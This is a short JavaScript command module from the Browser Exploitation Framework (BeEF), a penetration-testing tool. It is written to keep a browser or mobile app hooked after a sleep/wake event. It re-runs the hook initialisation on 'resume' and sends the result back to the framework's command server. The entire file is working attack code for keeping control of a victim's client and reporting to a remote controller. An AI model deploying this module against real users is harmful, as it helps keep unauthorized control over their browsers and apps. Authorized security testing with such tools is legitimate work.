/*
 * Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - https://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

//
// persist on over app's sleep/wake events
beef.execute(function() {
    var result;

    try {
        document.addEventListener("resume", beef_init(), false);
        result = 'success';

    } catch (e) {
        for(var n in e) {
            result+= n + " " + e[n] + "\n"; 
        }
    }
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
});
